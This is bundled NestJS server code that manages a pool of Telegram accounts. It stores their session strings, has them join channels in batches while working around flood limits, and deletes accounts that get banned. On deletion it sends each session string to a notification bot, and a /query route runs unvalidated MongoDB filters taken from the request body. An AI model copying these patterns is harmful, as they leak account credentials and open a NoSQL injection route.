        this.clientService.updateInfo().catch(error => {
            console.error('Error in checkPromoteClients:', error);
        });
        return "initiated Checking";
    }
    async joinChannelsforBufferClients() {
        return this.clientService.joinchannelForBufferClients();
    }
    async checkbufferClients() {
        this.clientService.checkBufferClients();
        return "initiated Checking";
    }
    async addNewUserstoBufferClients(body) {
        this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);
        return "initiated Checking";
    }
    async findAll() {
        return this.clientService.findAll();
    }
    async setAsBufferClient(mobile) {
        return await this.clientService.setAsBufferClient(mobile);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.clientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.BufferClientController = BufferClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_buffer_client_dto_1.CreateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_buffer__client_dto_1.SearchBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('updateInfo'),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote Clients Info' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "updateInfo", null);
__decorate([
    (0, common_1.Get)('joinChannelsForBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for BufferClients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "joinChannelsforBufferClients", null);
__decorate([
    (0, common_1.Get)('checkBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Buffer Clients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "checkbufferClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoBufferClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Buffer Clients' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "addNewUserstoBufferClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('SetAsBufferClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Buffer Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "setAsBufferClient", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_buffer_client_dto_1.UpdateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "executeQuery", null);
exports.BufferClientController = BufferClientController = __decorate([
    (0, swagger_1.ApiTags)('Buffer Clients'),
    (0, common_1.Controller)('bufferclients'),
    __metadata("design:paramtypes", [buffer_client_service_1.BufferClientService])
], BufferClientController);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.module.ts":
/*!***************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.module.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const buffer_client_controller_1 = __webpack_require__(/*! ./buffer-client.controller */ "./src/components/buffer-clients/buffer-client.controller.ts");
const buffer_client_schema_1 = __webpack_require__(/*! ./schemas/buffer-client.schema */ "./src/components/buffer-clients/schemas/buffer-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
let BufferClientModule = class BufferClientModule {
};
exports.BufferClientModule = BufferClientModule;
exports.BufferClientModule = BufferClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'bufferClientModule', schema: buffer_client_schema_1.BufferClientSchema, collection: 'bufferClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule),
            (0, common_1.forwardRef)(() => session_manager_1.SessionModule)
        ],
        controllers: [buffer_client_controller_1.BufferClientController],
        providers: [buffer_client_service_1.BufferClientService],
        exports: [buffer_client_service_1.BufferClientService]
    })
], BufferClientModule);


/***/ }),

/***/ "./src/components/buffer-clients/buffer-client.service.ts":
/*!****************************************************************!*\
  !*** ./src/components/buffer-clients/buffer-client.service.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var BufferClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ./../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const promote_client_service_1 = __webpack_require__(/*! ../promote-clients/promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let BufferClientService = BufferClientService_1 = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, promoteClientService, sessionService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.promoteClientService = promoteClientService;
        this.sessionService = sessionService;
        this.logger = new common_1.Logger(BufferClientService_1.name);
        this.joinChannelMap = new Map();
        this.joinChannelIntervalId = null;
        this.leaveChannelMap = new Map();
        this.leaveChannelIntervalId = null;
        this.isJoinChannelProcessing = false;
        this.isLeaveChannelProcessing = false;
        this.activeTimeouts = new Set();
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
        this.CLIENT_PROCESSING_DELAY = 5000;
        this.CHANNEL_PROCESSING_DELAY = 10000;
        this.MAX_MAP_SIZE = 100;
        this.CLEANUP_INTERVAL = 10 * 60 * 1000;
        this.MAX_NEEDED = 160;
        this.cleanupIntervalId = null;
    }
    async onModuleDestroy() {
        this.logger.log('Cleaning up BufferClientService resources');
        await this.cleanup();
    }
    async cleanup() {
        try {
            this.clearAllTimeouts();
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            this.clearMemoryCleanup();
            this.clearBufferMap();
            this.clearLeaveMap();
            this.isJoinChannelProcessing = false;
            this.isLeaveChannelProcessing = false;
            this.logger.log('BufferClientService cleanup completed');
        }
        catch (error) {
            this.logger.error('Error during cleanup:', error);
        }
    }
    startMemoryCleanup() {
        this.cleanupIntervalId = setInterval(() => {
            this.performMemoryCleanup();
        }, this.CLEANUP_INTERVAL);
        this.activeTimeouts.add(this.cleanupIntervalId);
    }
    clearMemoryCleanup() {
        if (this.cleanupIntervalId) {
            clearInterval(this.cleanupIntervalId);
            this.activeTimeouts.delete(this.cleanupIntervalId);
            this.cleanupIntervalId = null;
        }
    }
    performMemoryCleanup() {
        try {
            for (const [mobile, channels] of this.joinChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    console.log(`Cleaning up joinChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.joinChannelMap.delete(mobile);
                }
            }
            for (const [mobile, channels] of this.leaveChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    console.log(`Cleaning up leaveChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.leaveChannelMap.delete(mobile);
                }
            }
            if (this.joinChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.joinChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach((key) => this.joinChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from joinChannelMap to prevent memory leak`);
            }
            if (this.leaveChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.leaveChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach((key) => this.leaveChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from leaveChannelMap to prevent memory leak`);
            }
            this.logger.debug(`Map Memory Check completed. Maps sizes - Join: ${this.joinChannelMap.size}, Leave: ${this.leaveChannelMap.size}, Active timeouts: ${this.activeTimeouts.size}`);
        }
        catch (error) {
            this.logger.error('Error during memory cleanup:', error);
        }
    }
    createTimeout(callback, delay) {
        const timeout = setTimeout(() => {
            this.activeTimeouts.delete(timeout);
            callback();
        }, delay);
        this.activeTimeouts.add(timeout);
        return timeout;
    }
    clearAllTimeouts() {
        this.activeTimeouts.forEach((timeout) => {
            clearTimeout(timeout);
        });
        this.activeTimeouts.clear();
        this.logger.debug('Cleared all active timeouts');
    }
    checkMemoryHealth() {
        const memoryStats = {
            joinMapSize: this.joinChannelMap.size,
            leaveMapSize: this.leaveChannelMap.size,
            activeTimeouts: this.activeTimeouts.size,
            isJoinProcessing: this.isJoinChannelProcessing,
            isLeaveProcessing: this.isLeaveChannelProcessing,
        };
        this.logger.debug('Memory health check:', memoryStats);
        if (memoryStats.joinMapSize > this.MAX_MAP_SIZE * 0.9) {
            this.logger.warn('Join map approaching memory limit, performing emergency cleanup');
            this.performMemoryCleanup();
        }
        if (memoryStats.leaveMapSize > this.MAX_MAP_SIZE * 0.9) {
            this.logger.warn('Leave map approaching memory limit, performing emergency cleanup');
            this.performMemoryCleanup();
        }
    }
    async create(bufferClient) {
        const newUser = new this.bufferClientModel({
            ...bufferClient,
            status: bufferClient.status || 'active',
        });
        return newUser.save();
    }
    async findAll(status) {
        const filter = status ? { status } : {};
        return this.bufferClientModel.find(filter).exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.bufferClientModel
            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' })
            .exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log('Updating');
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log('creating');
            return this.create({
                ...createOrUpdateUserDto,
                status: createOrUpdateUserDto.status || 'active',
            });
        }
    }
    async remove(mobile) {
        try {
            const bufferClient = await this.findOne(mobile, false);
            if (!bufferClient) {
                throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
            }
            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\nsession: ${bufferClient.session}`)}`);
            await this.bufferClientModel.deleteOne({ mobile }).exec();
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            this.logger.error(`Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.status) {
            filter.status = filter.status;
        }
        return this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromBufferMap(key) {
        this.joinChannelMap.delete(key);
    }
    safeSetJoinChannelMap(mobile, channels) {
        if (this.joinChannelMap.size >= this.MAX_MAP_SIZE &&
            !this.joinChannelMap.has(mobile)) {
            this.logger.warn(`Join channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`);
            return false;
        }
        this.joinChannelMap.set(mobile, channels);
        return true;
    }
    safeSetLeaveChannelMap(mobile, channels) {
        if (this.leaveChannelMap.size >= this.MAX_MAP_SIZE &&
            !this.leaveChannelMap.has(mobile)) {
            this.logger.warn(`Leave channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`);
            return false;
        }
        this.leaveChannelMap.set(mobile, channels);
        return true;
    }
    clearBufferMap() {
        const mapSize = this.joinChannelMap.size;
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
        this.logger.debug(`BufferMap cleared, removed ${mapSize} entries`);
    }
    async updateStatus(mobile, status, message) {
        const updateData = { status };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
    async markAsInactive(mobile, reason) {
        return this.updateStatus(mobile, 'inactive', reason);
    }
    async updateInfo() {
        const clients = await this.bufferClientModel
            .find({
            status: 'active',
        })
            .sort({ channels: 1 });
        this.logger.debug(`Updating info for ${clients.length} buffer clients`);
        for (let i = 0; i < clients.length; i++) {
            const client = clients[i];
            const mobile = client.mobile;
            try {
                this.logger.debug(`Updating info for client ${i + 1}/${clients.length}: ${mobile}`);
                await (0, Helpers_1.sleep)(2000);
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                await (0, Helpers_1.sleep)(1500);
                const channels = await telegramClient.channelInfo(true);
                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
                await (0, Helpers_1.sleep)(1000);
                await this.update(mobile, { channels: channels.ids.length });
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                try {
                    await this.markAsInactive(mobile, `${errorDetails.message}`);
                }
                catch (markError) {
                    this.logger.error(`Error marking client ${mobile} as inactive:`, markError);
                }
                this.logger.error(`Error updating info for client ${mobile}:`, errorDetails);
            }
            finally {
                try {
                    await connection_manager_1.connectionManager.unregisterClient(mobile);
                }
                catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                }
                if (i < clients.length - 1) {
                    await (0, Helpers_1.sleep)(4000);
                }
            }
        }
        this.logger.debug('Completed updating info for all buffer clients');
    }
    async joinchannelForBufferClients(skipExisting = true) {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
            return 'Active client setup exists, skipping buffer promotion';
        }
        this.logger.log('Starting join channel process for buffer clients');
        this.joinChannelMap.clear();
        this.leaveChannelMap.clear();
        this.clearJoinChannelInterval();
        this.clearLeaveChannelInterval();
        await (0, Helpers_1.sleep)(3000);
        const existingKeys = skipExisting
            ? []
            : Array.from(this.joinChannelMap.keys());
        const clients = await this.bufferClientModel
            .find({
            channels: { $lt: 350 },
            mobile: { $nin: existingKeys },
        })
            .sort({ channels: 1 })
            .limit(8);
        this.logger.debug(`Found ${clients.length} buffer clients to process`);
        const joinSet = new Set();
        const leaveSet = new Set();
        let successCount = 0;
        let failCount = 0;
        for (let i = 0; i < clients.length; i++) {
            const document = clients[i];
            const mobile = document.mobile;
            this.logger.debug(`Processing buffer client ${i + 1}/${clients.length}: ${mobile}`);
            try {
                const client = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                await (0, Helpers_1.sleep)(2000);
                const channels = await client.channelInfo(true);
                this.logger.debug(`Client ${mobile} has ${channels.ids.length} existing channels`);
                await this.update(mobile, { channels: channels.ids.length });
                if (channels.canSendFalseCount < 10) {
                    const excludedIds = channels.ids;
                    const result = channels.ids.length < 220
                        ? await this.channelsService.getActiveChannels(150, 0, excludedIds)
                        : await this.activeChannelsService.getActiveChannels(150, 0, excludedIds);
                    if (!this.joinChannelMap.has(mobile)) {
                        if (this.safeSetJoinChannelMap(mobile, result)) {
                            joinSet.add(mobile);
                            this.logger.debug(`Added ${result.length} channels to join queue for ${mobile}`);
                        }
                        else {
                            this.logger.warn(`Failed to add ${mobile} to join queue due to memory limits`);
                        }
                    }
                    else {
                        this.logger.debug(`${mobile}: Already present in join map, skipping`);
                    }
                }
                else {
                    if (!this.leaveChannelMap.has(mobile)) {
                        if (this.safeSetLeaveChannelMap(mobile, channels.canSendFalseChats)) {
                            leaveSet.add(mobile);
                            this.logger.warn(`Client ${mobile} has ${channels.canSendFalseChats.length} restricted channels, added to leave queue`);
                        }
                        else {
                            this.logger.warn(`Failed to add ${mobile} to leave queue due to memory limits`);
                        }
                    }
                    else {
                        this.logger.debug(`${mobile}: Already present in leave map, skipping`);
                    }
                }
                successCount++;
            }
            catch (error) {
                failCount++;
                const errorDetails = (0, parseError_1.parseError)(error);
                const errorMsg = errorDetails?.message || error?.errorMessage || 'Unknown error';
                if ((0, utils_1.contains)(errorMsg, [
                    'SESSION_REVOKED',
                    'AUTH_KEY_UNREGISTERED',
                    'USER_DEACTIVATED',
                    'USER_DEACTIVATED_BAN',
                    'FROZEN_METHOD_INVALID',
                ])) {
                    this.logger.error(`Session invalid for ${mobile} due to ${errorMsg}, removing client`);
                    try {
                        await this.remove(mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (removeErr) {
                        this.logger.error(`Failed to remove client ${mobile}:`, removeErr);
                    }
                }
                else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorMsg}`);
                }
            }
            finally {
                try {
                    await connection_manager_1.connectionManager.unregisterClient(mobile);
                }
                catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                }
                if (i < clients.length - 1) {
                    await (0, Helpers_1.sleep)(this.CLIENT_PROCESSING_DELAY);
                }
            }
        }
        await (0, Helpers_1.sleep)(3000);
        if (joinSet.size > 0) {
            this.startMemoryCleanup();
            this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);
            this.createTimeout(() => this.joinChannelQueue(), 2000);
        }
        if (leaveSet.size > 0) {
            this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);
            this.createTimeout(() => this.leaveChannelQueue(), 5000);
        }
        this.logger.log(`Join process complete — Success: ${successCount}, Fail: ${failCount}`);
        return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;
    }
    async joinChannelQueue() {
        this.logger.debug('Attempting to start join channel queue');
        if (this.isJoinChannelProcessing) {
            this.logger.warn('Join channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }
        this.checkMemoryHealth();
        if (!this.joinChannelIntervalId) {
            this.logger.debug('Starting join channel interval');
            this.joinChannelIntervalId = setInterval(async () => {
                await this.processJoinChannelInterval();
            }, this.JOIN_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.joinChannelIntervalId);
            await this.processJoinChannelInterval();
        }
        else {
            this.logger.warn('Join channel interval is already running');
        }
    }
    async processJoinChannelInterval() {
        if (this.isJoinChannelProcessing) {
            this.logger.debug('Join channel process already running, skipping interval');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, clearing interval');
            this.clearJoinChannelInterval();
            return;
        }
        this.isJoinChannelProcessing = true;
        try {
            await this.processJoinChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in join channel queue', error);
        }
        finally {
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size === 0) {
                this.logger.debug('No more channels to join, clearing interval');
                this.clearJoinChannelInterval();
            }
        }
    }
    async processJoinChannelSequentially() {
        const keys = Array.from(this.joinChannelMap.keys());
        this.logger.debug(`Processing join channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            let currentChannel = null;
            try {
                const channels = this.joinChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                    this.removeFromBufferMap(mobile);
                    continue;
                }
                currentChannel = channels.shift();
                this.logger.debug(`${mobile} has ${channels.length} pending channels to join, processing: @${currentChannel.username}`);
                this.joinChannelMap.set(mobile, channels);
                await this.telegramService.tryJoiningChannel(mobile, currentChannel);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error: `, false);
                this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);
                if (errorDetails.error === 'FloodWaitError' ||
                    error.errorMessage === 'CHANNELS_TOO_MUCH') {
                    this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                    this.removeFromBufferMap(mobile);
                    try {
                        await (0, Helpers_1.sleep)(2000);
                        const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                        await this.update(mobile, { channels: channelsInfo.ids.length });
                    }
                    catch (updateError) {
                        this.logger.error(`Error updating channel count for ${mobile}:`, updateError);
                    }
                }
                if ((0, utils_1.contains)(errorDetails.message, [
                    'SESSION_REVOKED',
                    'AUTH_KEY_UNREGISTERED',
                    'USER_DEACTIVATED',
                    'USER_DEACTIVATED_BAN',
                    'FROZEN_METHOD_INVALID',
                ])) {
                    this.logger.error(`Session invalid for ${mobile}, removing client`);
                    this.removeFromBufferMap(mobile);
                    try {
                        await this.remove(mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (removeError) {
                        this.logger.error(`Error removing client ${mobile}:`, removeError);
                    }
                }
            }
            finally {
                try {
                    await connection_manager_1.connectionManager.unregisterClient(mobile);
                }
                catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}:`, unregisterError);
                }
                if (i < keys.length - 1 ||
                    this.joinChannelMap.get(mobile)?.length > 0) {
                    console.log(`Sleeping for ${this.CHANNEL_PROCESSING_DELAY} before continuing with next Mobile`);
                    await (0, Helpers_1.sleep)(this.CHANNEL_PROCESSING_DELAY);
                }
                else {
                    console.log(`Not Sleeping before continuing with next Mobile`);
                }
            }
        }
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.activeTimeouts.delete(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
        }
        this.isJoinChannelProcessing = false;
        this.logger.debug('Join channel processing cleared and flag reset');
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        const mapSize = this.leaveChannelMap.size;
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
        this.logger.debug(`LeaveMap cleared, removed ${mapSize} entries`);
    }
    async leaveChannelQueue() {
        this.logger.debug('Attempting to start leave channel queue');
        if (this.isLeaveChannelProcessing) {
            this.logger.warn('Leave channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        this.checkMemoryHealth();
        if (!this.leaveChannelIntervalId) {
            this.logger.debug('Starting leave channel interval');
